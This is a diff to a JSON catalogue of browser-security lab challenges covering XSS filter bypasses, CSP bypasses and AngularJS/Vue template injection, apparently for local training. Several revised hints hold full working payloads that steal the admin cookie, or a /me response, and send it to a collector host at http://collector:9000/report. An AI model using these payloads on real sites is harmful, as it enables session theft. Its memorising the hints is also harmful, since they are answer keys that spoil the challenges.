@@ -725,7 +725,7 @@
         "slug": "markdown-renderer-javascript-uri-bypass",
         "title": "Markdown Renderer — javascript: URI Filter Bypass",
         "difficulty": "practitioner",
-        "description": "A wiki uses markdown-it 13 with a custom link sanitiser that removes matches of /javascript:/gi from any href. The single-pass regex fails on unicode whitespace, HTML entities, and tab characters embedded in the scheme. The admin bot reviews new wiki pages and clicks the primary link in each page.",
+        "description": "A wiki renders markdown links into <a href> and \"sanitises\" each URL by stripping the substring javascript: with a single-pass, case-insensitive regex. A control character embedded in the scheme (java<TAB>script:) is not matched by the regex, but the browser strips tab/newline/CR from a URL on navigation, so the href resolves back to javascript: and runs. The admin bot reviews new pages and clicks the primary link in each.",
         "objective": "Post a wiki page whose rendered link, when clicked by the admin bot, executes JS and exfiltrates the admin's session cookie to http://collector:9000/report.",
         "flag_hint": "OOB collector captures cookie; /solve validates the value matches the current admin session and returns the flag.",
         "skills_taught": [
@@ -734,15 +734,14 @@
           "href-context sanitiser bypass"
         ],
         "tech_stack": [
-          "Node 20",
-          "Express 4",
-          "markdown-it 13 with custom link_open sanitiser",
-          "SQLite 3",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "custom markdown link renderer with a single-pass javascript: strip (the flaw)",
+          "@websec-lab/xss-verifier headless-Chromium bot (click delivery)",
+          "stdlib OOB collector"
         ],
-        "inspired_by": "GitLab wiki markdown XSS class of bugs (CVE-2022-2185 pattern) and Discourse markdown pipeline advisories"
+        "inspired_by": "The GitLab/Discourse-class wiki-markdown javascript:-URI filter-bypass bugs (e.g. the CVE-2022-2185 markdown pipeline pattern), abstracted for local Docker with a Flask renderer, a Playwright admin bot that clicks review links, and an OOB collector"
       },
       {
         "slug": "postmessage-origin-startswith-bypass",
@@ -771,20 +770,21 @@
         "slug": "jquery-location-hash-selector",
         "title": "jQuery(location.hash) Selector-to-HTML Coercion",
         "difficulty": "practitioner",
-        "description": "A legacy help-centre scrolls to a section on load with $(location.hash). When jQuery < 3.5 is passed a string that looks like HTML it constructs elements instead of selecting them, thanks to htmlPrefilter regex quirks that also let payloads survive.",
-        "objective": "Craft a URL whose hash coerces jQuery into constructing a new element with an event handler that fires; use it to steal the admin's session cookie via the OOB collector.",
-        "flag_hint": "OOB collector receives the cookie; /solve prints the flag when the value matches the current admin session cookie.",
+        "description": "A legacy help-centre scrolls to a section on load by passing the URL fragment to jQuery: $(decodeURIComponent(location.hash.slice(1))). jQuery's $() is overloaded — handed an HTML-looking string it CONSTRUCTS elements instead of selecting them, so a fragment like <img src=x onerror=...> builds an <img> whose onerror fires. Ships the vendored, EOL jQuery 3.4.1 (< 3.5 widens what counts as HTML) — that version IS the lesson.",
+        "objective": "Craft a URL whose #fragment coerces jQuery's $() into constructing an element with an event handler, running JS in the admin bot's browser to steal the admin session cookie to the OOB collector, then POST /solve.",
+        "flag_hint": "Submit /#<img src=x onerror=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\"> (URL-encoded) to POST /report; read the exfiltrated cookie via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
         "skills_taught": [
           "jQuery selector-to-element coercion",
           "location.hash sinks",
           "htmlPrefilter regressions before 3.5"
         ],
         "tech_stack": [
-          "Static HTML",
-          "jQuery 3.4.1",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "jQuery 3.4.1 (vendored; $(hash) selector-to-HTML quirk)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
         "inspired_by": "CVE-2020-11022 and CVE-2020-11023 (jQuery htmlPrefilter/regex regressions)"
       },
@@ -837,7 +837,7 @@
         "slug": "formaction-xss-button-injection",
         "title": "HTML5 formaction Attribute Injection",
         "difficulty": "practitioner",
-        "description": "A CMS lets you insert one <button> inside an existing <form> that has no action attribute (submitting to the current URL by default). The sanitiser allows <button> with a formaction attribute — a HTML5 override that changes the form's submit target.",
+        "description": "A CMS renders a contributor's draft HTML inside the editor's approve form, which carries an anti-CSRF token and has no action attribute (so it submits to the current URL by default). The draft is allow-list sanitised (nh3): scripts, event handlers and javascript: URIs are stripped, but a call-to-action <button> is permitted to keep the HTML5 formaction/formmethod attributes, which override where the enclosing form submits. The editor bot reviews each draft and clicks its CTA button.",
         "objective": "Use a formaction-bearing <button> to redirect the admin's next form submission to your attacker origin; capture the POST body (which includes the CSRF token and edited-page content) at the OOB collector.",
         "flag_hint": "OOB collector on port 9000 receives the POST body; /solve returns the flag when the current admin CSRF token value appears in a captured POST.",
         "skills_taught": [
@@ -846,15 +846,14 @@
           "exfil via form redirect (no JS required)"
         ],
         "tech_stack": [
-          "Node 20",
-          "NestJS 10",
-          "PostgreSQL 16",
-          "DOMPurify 2.4 (older permissive config)",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "nh3 0.2 allow-list sanitiser (permits <button formaction>) — the flaw",
+          "@websec-lab/xss-verifier headless-Chromium bot (click delivery)",
+          "stdlib OOB collector"
         ],
-        "inspired_by": "Michal Bentkowski / Cure53 formaction research and the DOMPurify hooks documentation examples"
+        "inspired_by": "Michał Bentkowski / Cure53 formaction research and the DOMPurify permissive-config examples, abstracted for local Docker with a Flask CMS, an nh3 allow-list sanitiser, a Playwright editor bot that clicks review buttons, and an OOB collector"
       },
       {
         "slug": "iframe-srcdoc-attribute-injection",
@@ -953,7 +952,7 @@
         "slug": "csp-jsonp-callback-bypass",
         "title": "CSP Bypass via JSONP Endpoint in Allowlist",
         "difficulty": "expert",
-        "description": "The app enforces script-src 'self' https://accounts.trusted.lab. The trusted host exposes /api/jsonp?callback=... which echoes the callback name into a JS function invocation. A reflected HTML injection exists on the target but 'unsafe-inline' is not permitted; the CSP only allows scripts loaded from allowlisted hosts.",
+        "description": "The app reflects ?q= into the page unescaped but relies on a strict CSP (script-src 'self' plus an allowlisted accounts host, no 'unsafe-inline') to neuter it: inline <script> and onerror handlers do not run. The allowlisted host exposes a JSONP endpoint that echoes the callback name verbatim, so a <script src> pointing there is CSP-permitted and executes attacker JS in the app origin with the admin's non-HttpOnly session cookie.",
         "objective": "Combine the HTML injection with the trusted-host JSONP callback abuse to execute arbitrary JavaScript under the app's CSP and exfiltrate the admin's session cookie to the OOB collector.",
         "flag_hint": "OOB collector receives the cookie; /solve returns the flag on match.",
         "skills_taught": [
@@ -963,18 +962,19 @@
         ],
         "tech_stack": [
           "Python 3.12",
-          "Flask 3.0 target",
-          "Node 20 + Express 4 mock trusted-host on second nginx 1.27 vhost",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Flask 3.1",
+          "gunicorn 23",
+          "stdlib mock trusted-host with a JSONP callback endpoint (the CSP-allowlisted script origin)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
-        "inspired_by": "Michele Spagnuolo / Lukas Weichselbaum 'CSP Is Dead, Long Live CSP' (2016) research and its 2022-2024 replays against GitHub / Salesforce"
+        "inspired_by": "The well-documented CSP script-src allowlist bypass class (Google's CSP-is-dead research on JSONP/AngularJS gadgets on allowlisted hosts), abstracted for local Docker with a Flask target, a mock allowlisted JSONP host, a Playwright admin bot, and an OOB collector"
       },
       {
         "slug": "csp-base-uri-relative-script-hijack",
         "title": "CSP Bypass via Missing base-uri Directive",
         "difficulty": "expert",
-        "description": "The app's CSP restricts script-src to 'self' but omits base-uri. A single-tag HTML injection is available inside <head>. Every legitimate script on the page is loaded via a relative path such as /assets/main.js.",
+        "description": "The CSP is script-src 'nonce-<random>' (no 'self', no 'unsafe-inline') but omits the base-uri directive, and the page loads a relative NONCED <script src=\"main.js\"> below a reflected ?ref= injection in <head>. A directly-injected <script src> is blocked (it carries no nonce), but an injected <base href> repoints the page's OWN nonced main.js at an attacker-uploaded same-origin path (/u/<id>/main.js) — the nonce rides the element, so it loads and runs in the app origin.",
         "objective": "Inject a <base href='//attacker.lab'> so that when the admin bot next loads a legitimate page, the relative-path script is fetched from the attacker origin under a URL that satisfies the same policy; hijack script execution and exfiltrate the admin cookie.",
         "flag_hint": "OOB collector receives the cookie; /solve returns the flag on match.",
         "skills_taught": [
@@ -983,33 +983,35 @@
           "minimising markup injections to a single tag"
         ],
         "tech_stack": [
-          "Ruby 3.3",
-          "Sinatra 4",
-          "relative-path bundle under /assets/*.js",
-          "second attacker origin served by nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "CSP script-src 'nonce-...' (no 'self') with NO base-uri directive (the flaw)",
+          "same-origin upload path /u/<id>/main.js as the base-uri hijack target",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
-        "inspired_by": "PortSwigger research on base-uri and Google Bughunter University CSP allowlist articles"
+        "inspired_by": "The documented base-uri / <base> hijack of relative-path scripts under CSP (Terjanq, Cure53 and the CSP base-uri guidance), abstracted for local Docker with a Flask target that omits base-uri, a same-origin upload path, a Playwright admin bot, and an OOB collector"
       },
       {
         "slug": "angularjs-sandbox-escape-172",
         "title": "AngularJS 1.7.2 Sandbox Escape (Client-Side Template Injection)",
         "difficulty": "expert",
-        "description": "A checkout confirmation page uses AngularJS 1.7.2 and interpolates a query parameter as an ng-bind expression: <div ng-app>{{name}}</div>. AngularJS 1.7 removed the sandbox and famously exposes constructor-based gadgets even in earlier versions.",
-        "objective": "Deliver a URL that, when opened by the admin bot, escapes the AngularJS expression sandbox and exfiltrates the admin's cookie to the OOB collector.",
-        "flag_hint": "OOB collector receives the cookie; /solve prints the flag on match.",
+        "description": "A checkout confirmation page bootstrapped with AngularJS 1.7.2 (ng-app) reflects ?name=, HTML-ESCAPED, into the text of the Angular-compiled region. Escaping stops <script>/attribute injection but not {{ }} interpolation — AngularJS 1.6+ removed the expression sandbox, so a {{ constructor.constructor(...)() }} gadget reaches the Function constructor. Client-side template injection.",
+        "objective": "Deliver a URL whose ?name= is an AngularJS {{}} expression that escapes to arbitrary JS in the admin bot's browser and exfiltrates the admin cookie to the OOB collector, then POST /solve.",
+        "flag_hint": "Submit /?name={{constructor.constructor(\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\")()}} (URL-encoded) to POST /report; read the exfiltrated cookie via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
         "skills_taught": [
           "client-side template injection",
           "AngularJS sandbox-escape gadgets (constructor.constructor)",
           "why the AngularJS team abandoned the sandbox"
         ],
         "tech_stack": [
-          "Static site",
-          "AngularJS 1.7.2 pinned",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "AngularJS 1.7.2 (vendored; sandbox-less {{}} template injection)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
         "inspired_by": "PortSwigger's AngularJS sandbox-escape series by Gareth Heyes and Mario Heiderich (2015-2018)"
       },
@@ -1017,22 +1019,21 @@
         "slug": "vue2-template-compile-injection",
         "title": "Vue 2 Template Injection via Runtime Vue.compile",
         "difficulty": "expert",
-        "description": "A Nuxt 2 dashboard uses v-html for one field (sanitised) and Vue.compile() at runtime on another field so that customers can supply custom templates for a widget. The compile-time surface accepts full Vue expressions.",
-        "objective": "Deliver content that triggers Vue.compile on user input, executes a template expression, and POSTs the /me API response to the OOB collector.",
-        "flag_hint": "OOB collector receives the /me body; /solve returns the flag when the admin's /me content is received.",
+        "description": "A dashboard lets customers supply a custom widget template which the admin dashboard compiles at runtime with Vue.compile() (Vue 2.7). The template is embedded in a hidden div (HTML-escaped) and read via textContent (which decodes it), so the raw template reaches the compiler; Vue 2 evaluates {{ }} expressions in the component scope, and constructor.constructor reaches Function. Client-side template injection.",
+        "objective": "Deliver a widget template that Vue.compile executes in the admin bot's browser, fetches the admin-only /me (same-origin, cookie sent), and beacons the token to the OOB collector, then POST /solve.",
+        "flag_hint": "POST /widget {\"template\":\"<span>{{ constructor.constructor(\\\"fetch('/me').then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?m='+encodeURIComponent(t)})\\\")() }}</span>\"}; read the exfiltrated token via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}. /me and /admin/dashboard are 403 for you.",
         "skills_taught": [
           "Vue.compile as a dangerous sink",
           "difference between v-html and runtime template compilation",
           "framework-specific CSTI"
         ],
         "tech_stack": [
-          "Node 20",
-          "Nuxt 2.17",
-          "Vue 2.7",
-          "PostgreSQL 16",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "Vue 2.7.16 (vendored full build; runtime Vue.compile of user input)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
         "inspired_by": "CVE-2024-6783 (Vue 2 template-compiler XSS) and PortSwigger's Vue.js CSTI research"
       },
